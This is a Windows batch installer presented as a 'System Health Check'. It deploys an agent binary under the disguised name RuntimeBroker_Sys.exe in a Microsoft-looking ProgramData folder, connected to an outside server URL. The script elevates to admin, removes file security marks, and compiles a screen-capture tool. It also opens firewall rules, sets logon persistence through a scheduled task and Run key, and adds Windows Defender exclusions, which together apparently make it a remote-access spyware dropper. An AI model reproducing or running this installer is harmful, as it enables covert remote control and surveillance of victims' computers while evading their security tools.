@echo off
setlocal EnableDelayedExpansion
title System Health Check
color 0A

:: ─── ADMIN ELEVATION (PowerShell method — works on Win10/11) ───
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Requesting Full System Permissions...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /B
)
pushd "%CD%"
CD /D "%~dp0"

:: ─── CONFIGURATION ───
set "INSTALL_DIR=C:\ProgramData\Microsoft\Windows\SystemHealth"
set "BIN_NAME=RuntimeBroker_Sys.exe"
set "SERVER_URL=https://h-boss-production.up.railway.app"
set "TASK_NAME=MicrosoftWindowsHealthMonitor"
set "REG_KEY=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
set "REG_NAME=WindowsSystemHealth"

echo ==========================================================
echo    SYSTEM HEALTH MONITOR - DEPLOYMENT ENGINE v9.0
echo ==========================================================
echo.
echo   Server  : %SERVER_URL%
echo   Install : %INSTALL_DIR%
echo.

:: ─── STEP 1: REMOVE FILE BLOCKS (Mark of the Web) ───
echo [1/8] Removing file security blocks...
powershell -NoProfile -Command "Get-ChildItem -Path '%~dp0' -Recurse | Unblock-File -ErrorAction SilentlyContinue" >nul 2>&1
echo       Done.
echo.

:: ─── STEP 2: CHECK DEPENDENCIES ───
echo [2/8] Checking system prerequisites...

set "HAS_VCREDIST=0"
reg query "HKLM\SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x64" /v "Version" >nul 2>&1
if %errorlevel% equ 0 set "HAS_VCREDIST=1"
echo       VC++ Runtime : %HAS_VCREDIST% (1=OK, 0=Missing)

if "%HAS_VCREDIST%"=="0" (
    echo       [~] VC++ Runtime missing. Downloading...
    powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://aka.ms/vs/17/release/vc_redist.x64.exe' -OutFile '%TEMP%\vc_redist.x64.exe'" >nul 2>&1
    if exist "%TEMP%\vc_redist.x64.exe" (
        echo       [~] Installing silently...
        "%TEMP%\vc_redist.x64.exe" /install /quiet /norestart
        del /F /Q "%TEMP%\vc_redist.x64.exe" >nul 2>&1
        echo       [*] VC++ Runtime installed.
    ) else (
        echo       [!] Download failed. Continuing anyway.
    )
)

set "HAS_DOTNET=0"
if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" set "HAS_DOTNET=1"
if exist "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" set "HAS_DOTNET=1"
echo       .NET Framework: %HAS_DOTNET% (1=OK, 0=Missing)
echo.

:: ─── STEP 3: CLEAN OLD INSTALLATION ───
echo [3/8] Clearing old instances...
taskkill /F /IM "%BIN_NAME%" /T >nul 2>&1
taskkill /F /IM "teram_agent.exe" /T >nul 2>&1
taskkill /F /IM "wscript.exe" /T >nul 2>&1
taskkill /F /IM "ScreenCap.exe" /T >nul 2>&1
ping 127.0.0.1 -n 2 >nul

schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
reg delete "%REG_KEY%" /v "%REG_NAME%" /f >nul 2>&1
reg delete "%REG_KEY%" /v "WindowsHealthCheck" /f >nul 2>&1

if exist "%INSTALL_DIR%" (
    attrib -h -s -r "%INSTALL_DIR%" /D /S >nul 2>&1
    takeown.exe /F "%INSTALL_DIR%" /R /A /D Y >nul 2>&1
    icacls.exe "%INSTALL_DIR%" /grant Administrators:F /T /C /Q >nul 2>&1
    icacls.exe "%INSTALL_DIR%" /reset /T /C /Q >nul 2>&1
    rmdir /S /Q "%INSTALL_DIR%" >nul 2>&1
)
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
echo       Done.
echo.

:: ─── STEP 4: INSTALL FILES ───
echo [4/8] Installing agent files...

:: Verify we have a binary to install
if not exist "%~dp0teram_agent.exe" (
    if not exist "%~dp0node.exe" (
        echo [ERROR] Agent binary not found!
        echo         Place teram_agent.exe next to this script.
        pause
        exit /B
    )
)

:: Copy all project files to install dir
xcopy /E /I /Q /Y /H "%~dp0*" "%INSTALL_DIR%" >nul 2>&1
if %errorlevel% neq 0 (
    robocopy "%~dp0" "%INSTALL_DIR%" /E /IS /IT /NP /NFL /NDL /NJH /NJS >nul 2>&1
)

:: Set up the main executable
if exist "%~dp0teram_agent.exe" (
    copy /Y "%~dp0teram_agent.exe" "%INSTALL_DIR%\%BIN_NAME%" >nul
    set "AGENT_CMD=%INSTALL_DIR%\%BIN_NAME% %SERVER_URL%"
) else (
    copy /Y "%~dp0node.exe" "%INSTALL_DIR%\%BIN_NAME%" >nul
    set "AGENT_CMD=%INSTALL_DIR%\%BIN_NAME% index.js %SERVER_URL%"
)

:: Compile ScreenCap if .NET is available
if "%HAS_DOTNET%"=="1" (
    if exist "%INSTALL_DIR%\ScreenCap.cs" (
        set "CSC="
        if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" set "CSC=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
        if not defined CSC set "CSC=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
        "!CSC!" /nologo /target:winexe /out:"%INSTALL_DIR%\ScreenCap.exe" /r:System.Windows.Forms.dll,System.Drawing.dll "%INSTALL_DIR%\ScreenCap.cs" >nul 2>&1
    )
)

:: Unblock all exe files in install dir
powershell -NoProfile -Command "Get-ChildItem -Path '%INSTALL_DIR%' -Filter '*.exe' | Unblock-File -ErrorAction SilentlyContinue" >nul 2>&1

:: Set proper ACLs: SYSTEM and Admins get full, Users get read+execute
icacls "%INSTALL_DIR%" /inheritance:r /grant "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F" "BUILTIN\Users:(OI)(CI)RX" /T /C /Q >nul 2>&1
echo       Done.
echo.

:: ─── STEP 5: FIREWALL RULES ───
echo [5/8] Configuring firewall...
netsh advfirewall firewall delete rule name="Windows System Health" >nul 2>&1
netsh advfirewall firewall delete rule name="Windows System Health In" >nul 2>&1
netsh advfirewall firewall add rule name="Windows System Health" dir=out action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
netsh advfirewall firewall add rule name="Windows System Health In" dir=in action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
echo       Done.
echo.

:: ─── STEP 6: AUTO-START (Scheduled Task + Registry) ───
echo [6/8] Registering auto-start...

:: Primary: Scheduled Task — runs on logon with highest privileges
schtasks /Create /TN "%TASK_NAME%" /TR "\"%INSTALL_DIR%\%BIN_NAME%\" %SERVER_URL%" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
if %errorlevel% equ 0 (
    echo       Scheduled Task : OK
) else (
    echo       Scheduled Task : FAILED (will use registry fallback)
)

:: Backup: Registry Run key
reg add "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "\"%INSTALL_DIR%\%BIN_NAME%\" %SERVER_URL%" /f >nul 2>&1
if %errorlevel% equ 0 (
    echo       Registry Key   : OK
) else (
    echo       Registry Key   : FAILED
)
echo.

:: ─── STEP 7: DEFENDER EXCLUSION ───
echo [7/8] Adding security exclusion...
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -NoProfile -Command "Add-MpPreference -ExclusionProcess '%BIN_NAME%' -ErrorAction SilentlyContinue" >nul 2>&1
echo       Done.
echo.

:: ─── STEP 8: LAUNCH AGENT ───
echo [8/8] Starting agent...
start "" "%INSTALL_DIR%\%BIN_NAME%" %SERVER_URL%

:: Wait and verify it started
set "LAUNCH_OK=0"
ping 127.0.0.1 -n 4 >nul
tasklist /FI "IMAGENAME eq %BIN_NAME%" 2>nul | find /i "%BIN_NAME%" >nul
if %errorlevel% equ 0 set "LAUNCH_OK=1"

echo.
echo ==========================================================
if "%LAUNCH_OK%"=="1" (
    echo    DEPLOYMENT COMPLETE - AGENT IS RUNNING
) else (
    echo    DEPLOYMENT COMPLETE - AGENT WILL START ON NEXT LOGIN
)
echo ==========================================================
echo.
echo   Server      : %SERVER_URL%
echo   Location    : %INSTALL_DIR%
echo   Auto-Start  : Scheduled Task + Registry
echo   Firewall    : Allowed
echo.
echo   The agent will auto-start on every login.
echo   You can safely close this window.
echo ==========================================================
echo.
ping 127.0.0.1 -n 5 >nul
exit /B
